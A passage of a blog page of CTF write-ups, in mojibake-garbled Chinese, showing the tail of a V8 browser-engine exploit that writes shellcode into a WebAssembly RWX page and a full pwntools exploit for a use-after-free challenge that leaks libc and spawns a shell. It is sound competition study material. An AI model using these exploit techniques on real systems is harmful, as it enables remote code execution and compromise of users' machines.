class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">var addr_f = addrOf(f);</span></span><br><span class="line"><span class="comment">%DebugPrint(f);</span></span><br><span class="line"><span class="comment">var shared_function_info_addr = arbRead32(addr_f + 0x10n);</span></span><br><span class="line"><span class="comment">var trusted_function_data_addr = arbRead32(shared_info_addr + 0x4n);</span></span><br><span class="line"><span class="comment">internal_addr = arbRead32(trusted_function_data_addr + 0x10n);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">trusted_data_addr = <span class="title function_">arbRead32</span>(<span class="title function_">addrOf</span>(wasmInstance) + <span class="number">0xcn</span>);</span><br><span class="line">jump_table_start_addr = <span class="title function_">arbRead64</span>(trusted_data_addr + <span class="number">0x28n</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Trusted Data Addr : 0x&#x27;</span> + trusted_data_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Jump Table Start Addr : 0x&#x27;</span> + jump_table_start_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Backing Store Addr : 0x&#x27;</span> + <span class="title function_">arbRead64</span>(buf_backing_store_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">helpers.printhex(jump_table_start_addr);</span></span><br><span class="line"><span class="comment">helpers.printhex(arbRead64(buf_backing_store_addr));</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">     </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Overwriting Backing Store Addr ...&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">arbWrite</span>(buf_backing_store_addr, jump_table_start_addr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Writing Shellcode to wasm rwx page ...&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc_arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(i * <span class="number">8</span>, helpers.<span class="title function_">i64tof64</span>(sc_arr[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Trigger Shellcode !&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<h3 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h3><p>ç„¶å¾Œæˆ‘åœ¨ 9&#x2F;20 å¯«å¥½ Exploit æƒ³èªªæ‡‰è©²ä¸ç”¨æ”¹é¡Œç›®äº†<br>çµæœæœ‰äººåœ¨ 10&#x2F;2 æ—©ä¸Šåœ¨ X ä¸Šç™¼äº† Exploit</p>
<p><a target="_blank" rel="noopener" href="https://x.com/r1ngz3ro/status/1973448435614490640">https://x.com/r1ngz3ro/status/1973448435614490640</a> </p>
<p>å¾Œé¢å¾ˆèªçœŸçš„åœ¨æƒ³è¦ä¸è¦é–‹ Heap Sandbox è®“å¤§å®¶ç¹çš„ï¼Œä½†æœ€å¾Œæ”¶æ‰‹äº† XDDD<br>ç¾å ´æ²’ä»€éº¼äººæ‰“é V8ï¼Œæ‰€ä»¥é€™é¡Œæ²’äººæƒ³è§£ QQ</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/28/AEGIS-2025-Quals/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/28/AEGIS-2025-Quals/" class="post-title-link" itemprop="url">ç¥ç›¾ç›ƒ 2025 åˆè³½</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-09-28 13:31:03 / Modified: 13:41:19" itemprop="dateCreated datePublished" datetime="2025-09-28T13:31:03+08:00">2025-09-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>åˆè³½ç¬¬äºŒï¼Œå¯ä»¥å»å°å—ç©äº†</p>
<h2 id="N2"><a href="#N2" class="headerlink" title="N2"></a>N2</h2><p>backup_and_delete_note() æœ‰ UAF<br>ç„¶å¾Œä»– show æ˜¯é€é function pointer å» call<br><del>åˆæ˜¯ UAF è€æ¢—ï¼Œåªæ˜¯ç”¨ C++ å¯«çš„</del><br><del>ä¸çŸ¥é“ç‚ºå•¥åªæœ‰ 5 éšŠè§£</del><br>ç”¨ tcache LIFO çš„ç‰¹æ€§æ’ä¸€ä¸‹ heap æ‹¿åˆ°æœ‰ function pointer çš„ chunk å°±å¯ä»¥äº†<br>ç´°ç¯€å¯ä»¥çœ‹ exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 v5; // rax</span><br><span class="line">  int choice; // [rsp+4h] [rbp-Ch] BYREF</span><br><span class="line">  unsigned __int64 v7; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  setup();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    std::istream::operator&gt;&gt;(&amp;std::cin, &amp;choice);</span><br><span class="line">    if ( choice == 4 )</span><br><span class="line">      break;</span><br><span class="line">    if ( choice &gt; 4 )</span><br><span class="line">      goto LABEL_12;</span><br><span class="line">    switch ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      case 3:</span><br><span class="line">        show_note();</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        add_note();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        backup_and_delete_note();</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">LABEL_12:</span><br><span class="line">        v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Invalid choice.&quot;);</span><br><span class="line">        std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Goodbye!&quot;);</span><br><span class="line">  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned __int64 show_note(void)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v0; // rbx</span><br><span class="line">  __int64 v2; // rax</span><br><span class="line">  void (***v3)(void); // rax</span><br><span class="line">  __int64 v4; // rbx</span><br><span class="line">  __int64 v5; // rax</span><br><span class="line">  unsigned int v7; // [rsp+4h] [rbp-1Ch] BYREF</span><br><span class="line">  unsigned __int64 v8; // [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Enter note index to show: &quot;);</span><br><span class="line">  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">  v0 = v7;</span><br><span class="line">  if ( v0 &gt;= std::vector&lt;Note *&gt;::size(&amp;notes) || !*(_QWORD *)std::vector&lt;Note *&gt;::operator[](&amp;notes, v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Invalid index or note already deleted.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (void (***)(void))std::vector&lt;Note *&gt;::operator[](&amp;notes, v7);</span><br><span class="line">    (**v3)();</span><br><span class="line">    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Content: &quot;);</span><br><span class="line">    v5 = std::vector&lt;Note *&gt;::operator[](&amp;notes, v7);</span><br><span class="line">    v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, *(_QWORD *)(*(_QWORD *)v5 + 8LL));</span><br><span class="line">  &#125;</span><br><span class="line">  std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  return v8 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// +0x0 function pointer</span><br><span class="line">// +0x8 content_ptr</span><br><span class="line">// +0x10 cnotent_chunk_size</span><br><span class="line">unsigned __int64 add_note(void)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax</span><br><span class="line">  __int64 v1; // rax</span><br><span class="line">  __int64 v2; // rbx</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 v4; // rbx</span><br><span class="line">  __int64 v5; // rax</span><br><span class="line">  __int64 v6; // rax</span><br><span class="line">  _DWORD size[3]; // [rsp+Ch] [rbp-24h] BYREF</span><br><span class="line">  unsigned __int64 v9; // [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Enter note size: &quot;);</span><br><span class="line">  std::istream::operator&gt;&gt;(&amp;std::cin, size);</span><br><span class="line">  if ( size[0] &lt;= 0x800u )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)&amp;size[1] = malloc(0x18uLL);</span><br><span class="line">    if ( *(_QWORD *)&amp;size[1] )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)&amp;size[1] = show_content;     // function pointer</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;size[1] + 0x10LL) = size[0];</span><br><span class="line">      v2 = *(_QWORD *)&amp;size[1];</span><br><span class="line">      *(_QWORD *)(v2 + 8) = malloc(size[0]);</span><br><span class="line">      if ( *(_QWORD *)(*(_QWORD *)&amp;size[1] + 8LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Enter content: &quot;);</span><br><span class="line">        read(0, *(void **)(*(_QWORD *)&amp;size[1] + 8LL), size[0]);</span><br><span class="line">        std::vector&lt;Note *&gt;::push_back(&amp;notes, &amp;size[1]);</span><br><span class="line">        v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Note added at index &quot;);</span><br><span class="line">        v5 = std::vector&lt;Note *&gt;::size(&amp;notes);</span><br><span class="line">        v6 = std::ostream::operator&lt;&lt;(v4, v5 - 1);</span><br><span class="line">        std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Content allocation failed!&quot;);</span><br><span class="line">        std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">        free(*(void **)&amp;size[1]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Allocation failed!&quot;);</span><br><span class="line">      std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Size too large!&quot;);</span><br><span class="line">    std::ostream::operator&lt;&lt;(v0, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  return v9 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned __int64 backup_and_delete_note(void)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v0; // rbx</span><br><span class="line">  __int64 v2; // rax</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rax</span><br><span class="line">  __int64 v6; // rax</span><br><span class="line">  __int64 v7; // rax</span><br><span class="line">  __int64 v8; // rax</span><br><span class="line">  __int64 v9; // rax</span><br><span class="line">  __int64 v10; // rax</span><br><span class="line">  unsigned int v12; // [rsp+Ch] [rbp-24h] BYREF</span><br><span class="line">  void *ptr; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v14; // [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Enter note index to backup and delete: &quot;);</span><br><span class="line">  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v12);</span><br><span class="line">  v0 = v12;</span><br><span class="line">  if ( v0 &gt;= std::vector&lt;Note *&gt;::size(&amp;notes) || !*(_QWORD *)std::vector&lt;Note *&gt;::operator[](&amp;notes, v12) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Invalid index!&quot;);</span><br><span class="line">    std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = *(void **)std::vector&lt;Note *&gt;::operator[](&amp;notes, v12);</span><br><span class="line">    if ( *((_DWORD *)ptr + 4) &lt;= 0x200u )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Backing up note &quot;);</span><br><span class="line">      v6 = std::ostream::operator&lt;&lt;(v5, v12);</span><br><span class="line">      v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot;...&quot;);</span><br><span class="line">      std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">      v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Backup successful.&quot;);</span><br><span class="line">      std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">      free(*((void **)ptr + 1));</span><br><span class="line">      free(ptr);</span><br><span class="line">      *(_QWORD *)std::vector&lt;Note *&gt;::operator[](&amp;notes, v12) = 0LL;</span><br><span class="line">      v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Note &quot;);</span><br><span class="line">      v10 = std::ostream::operator&lt;&lt;(v9, v12);</span><br><span class="line">      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v10, &quot; deleted successfully.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Backup failed: Note content is too large to backup.&quot;);</span><br><span class="line">      std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">      free(*((void **)ptr + 1));</span><br><span class="line">      free(ptr);</span><br><span class="line">      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Deletion aborted. Please try again later.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  return v14 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt; &#x27;, str(1))</span><br><span class="line">    p.sendlineafter(b&#x27;Enter note size: &#x27;, str(size))</span><br><span class="line">    p.sendlineafter(b&#x27;Enter content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt; &#x27;, str(2))</span><br><span class="line">    p.sendlineafter(b&#x27;Enter note index to backup and delete: &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt; &#x27;, str(3))</span><br><span class="line">    p.sendlineafter( b&#x27;Enter note index to show: &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./n2&#x27;)</span><br><span class="line">p = remote(&#x27;0.cloud.chals.io&#x27;, 28850)</span><br><span class="line">elf = ELF(&#x27;./n2&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x500, b&#x27;a&#x27;) #0</span><br><span class="line">add(0x18, b&#x27;a&#x27;) #1</span><br><span class="line">delete(0)</span><br><span class="line">add(0x500, b&#x27;&#x27;) #2</span><br><span class="line">show(2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Content: \n&#x27;)</span><br><span class="line">libc.address = (u64(p.recvline().strip().ljust(8, b&#x27;\x00&#x27;)) &lt;&lt; 8) - 0x203b00</span><br><span class="line">print(&#x27;[+] libc :&#x27;, hex(libc.address))</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">one_gadget = libc.address + 0xef4ce</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x583ec posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x68 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rax == NULL || &#123;&quot;sh&quot;, rax, rip+0x17301e, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br><span class="line"></span><br><span class="line">0x583f3 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x68 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL || &#123;rcx, rax, rip+0x17301e, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br><span class="line"></span><br><span class="line">0xef4ce execve(&quot;/bin/sh&quot;, rbp-0x50, r12)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x48 is writable</span><br><span class="line">  rbx == NULL || &#123;&quot;/bin/sh&quot;, rbx, NULL&#125; is a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br><span class="line"></span><br><span class="line">0xef52b execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x78])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x50 is writable</span><br><span class="line">  rax == NULL || &#123;&quot;/bin/sh&quot;, rax, NULL&#125; is a valid argv</span><br><span class="line">  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">add(0x18, b&#x27;a&#x27;) #3</span><br><span class="line"></span><br><span class="line">add(0x280, b&#x27;a&#x27;) #4</span><br><span class="line">add(0x18, b&#x27;a&#x27;) #5</span><br><span class="line">delete(4)</span><br><span class="line">delete(5)</span><br><span class="line">add(0x280, b&#x27;a&#x27;) #6</span><br><span class="line">add(0x18, p64(one_gadget)) #7</span><br><span class="line"></span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"># AEGIS&#123;Wh0_the_h31l_let_you_m4ke_tHe_d3cision&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/12/Maglev-Float64ToTagged-ConversionMode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/12/Maglev-Float64ToTagged-ConversionMode/" class="post-title-link" itemprop="url">Maglev Float64ToTagged ConversionMode</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-09-12 00:28:34 / Modified: 01:25:19" itemprop="dateCreated datePublished" datetime="2025-09-12T00:28:34+08:00">2025-09-12</time>
